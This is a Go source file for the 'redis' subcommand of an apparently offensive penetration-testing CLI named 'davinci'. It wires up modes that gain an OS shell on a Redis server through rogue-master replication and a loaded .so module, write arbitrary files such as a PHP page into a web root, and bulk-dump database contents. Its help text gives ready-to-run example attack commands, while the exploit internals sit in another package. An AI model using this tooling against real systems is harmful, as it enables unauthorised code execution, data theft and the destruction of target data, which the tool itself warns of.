package cmd

import (
	"davinci/common"
	"davinci/common/log"
	"davinci/core"
	"fmt"
	"github.com/spf13/cobra"
	"io/ioutil"
	"os"
)

var (
	redisHost                  string
	redisPort                  int
	redisUser                  string
	redisPasswd                string
	redisExec                  string
	redisMasterIp              string
	redisMasterPort            int
	redisTargetFile            string
	redisSourceFile            string
	redisContent               string
	redisRdbBack_writefile     bool
	redisRogueMaster_writefile bool
	redisNoBackup              bool
	redisNoInteractive_osshell bool

	redisCmd = &cobra.Command{
		Use:   "redis [exec|shell|auto_gather|writefile|osshell]",
		Short: "redis client",
		Long: "redis client:\n" +
			"  - exec:        execute the command once and return directly\n" +
			"  - shell:       redis interactive shell\n" +
			"  - auto_gather: automatically collect database information, including users, databases,\n" +
			"                 tables, table structures, and the first 5 rows of data for each table\n" +
			"  - osshell:     exec os shell through master-slave replication(RogueMaster),write so and load module\n" +
			"  - writefile:   write file,two ways: [rdbback|roguemaster]\n" +
			"  !!!note: use master-slave replication method(osshell or roguemaster to writefile) will clear target redis data\n" +
			"\n" +
			"Example: \n" +
			"  davinci redis exec        -H 192.168.1.2 -P 6379 -p 123456 -c \"info\" \n" +
			"  davinci redis shell       -H 192.168.1.2 -P 6379 -p 123456 \n" +
			"  davinci redis auto_gather -H 192.168.1.2 -P 6379 -p 123456 \n" +
			"  davinci redis osshell     -H 192.168.1.2 -P 6379 -p 123456 -l 192.168.1.1\n" +
			"  davinci redis osshell     -H 192.168.1.2 -P 6379 -p 123456 -l 192.168.1.1 --no-interactive -c \"whoami\"\n" +
			"  davinci redis writefile   -H 192.168.1.2 -P 6379 -p 123456 --rdb -C \"<?php phpinfo(); ?>\" -t /var/www/html/1.php \n" +
			"  davinci redis writefile   -H 192.168.1.2 -P 6379 -p 123456 --master -l 192.168.1.1 -s ./eval.so -t /tmp/eval.so \n" +
			"  ",
		Args:      cobra.ExactValidArgs(1),
		ValidArgs: []string{"exec", "shell", "auto_gather", "writefile", "osshell"},
		RunE: func(command *cobra.Command, args []string) error {
			service := &core.Redis{
				Host:   redisHost,
				Port:   redisPort,
				User:   redisUser,
				Passwd: redisPasswd,
				Cmd:    redisExec,
			}
			defer service.Close()
			if redisMasterPort == 0 {
				redisMasterPort, _ = common.GetAvailablePort()
			}
			switch args[0] {
			case "exec":
				if redisExec == "" {
					return fmt.Errorf("davinci redis exec must have cmd")
				}
				service.ExecuteOnce()
			case "shell":
				service.Shell()
			case "auto_gather":
				service.AutoGather()
			case "osshell":
				confirmAndCheck()
				if redisNoInteractive_osshell && redisExec == "" {
					return fmt.Errorf("davinci redis osshell no interactive need cmd,please use -c to specify")
				}
				service.OsExec_RogueMaster(redisMasterIp, redisExec, redisMasterPort, !redisNoInteractive_osshell, !redisNoBackup)
			case "writefile":
				if redisSourceFile == "" && redisContent == "" {
					return fmt.Errorf("davinci redis writefile must have source or content")
				}
				if redisTargetFile == "" {
					return fmt.Errorf("davinci redis writefile must have target")
				}
				if !redisRdbBack_writefile && !redisRogueMaster_writefile {
					return fmt.Errorf("please choose mode [rdb|master]")
				}
				var data []byte
				if redisContent != "" {
					data = []byte(redisContent)
				} else {
					var readErr error
					if data, readErr = ioutil.ReadFile(redisSourceFile); readErr != nil {
						return readErr
					}
				}
				if redisRdbBack_writefile {
					service.WriteFile_by_RDBBack(redisTargetFile, data)
				} else {
					confirmAndCheck()
					service.WriteFile_by_RogueMaster(redisTargetFile, redisMasterIp, redisMasterPort, data, !redisNoBackup)
				}

			}
			return nil
		},
	}
)

func confirmAndCheck() {
	if redisMasterIp == "" {
		log.Warn(fmt.Errorf("use master-slave replication must be set master ip (lhost)"))
		os.Exit(0)
	}
}

func init() {

	redisCmd.Flags().StringVarP(&redisHost, "host", "H", "127.0.0.1", "redis ip addr")
	redisCmd.Flags().IntVarP(&redisPort, "port", "P", 6379, "redis port")
	redisCmd.Flags().StringVarP(&redisUser, "user", "u", "", "username")
	redisCmd.Flags().StringVarP(&redisPasswd, "passwd", "p", "", "pasword")
	redisCmd.Flags().StringVarP(&redisExec, "cmd", "c", "", "redis cmd to be executed, only used in exec and osshell mode")
	redisCmd.Flags().StringVarP(&redisTargetFile, "target", "t", "", "[write/read] (remote) target file path,use for write file mode")
	redisCmd.Flags().StringVarP(&redisSourceFile, "source", "s", "", "[write] (local)  source file path,use for write file mode")
	redisCmd.Flags().StringVarP(&redisContent, "content", "C", "", "[write] write content to target,use for write file mode,choose one of content and source")
	redisCmd.Flags().BoolVarP(&redisRdbBack_writefile, "rdb", "", false, "[write] use rdb backup to writefile")
	redisCmd.Flags().BoolVarP(&redisRogueMaster_writefile, "master", "", false, "[write] use master-slave replication to writefile")
	redisCmd.Flags().BoolVarP(&redisNoBackup, "no-backup", "", false, "do not backup/dump data before using the master-slave replication method")
	redisCmd.Flags().BoolVarP(&redisNoInteractive_osshell, "no-interactive", "", false, "no-interactive with os shell")
	redisCmd.Flags().StringVarP(&redisMasterIp, "lhost", "l", "", "[write/osshell] use master-slave replication must be set master ip (lhost)")
	redisCmd.Flags().IntVarP(&redisMasterPort, "lport", "", 0, "[write/osshell] master port,by default, a random available port will be selected")

	rootCmd.AddCommand(redisCmd)
}
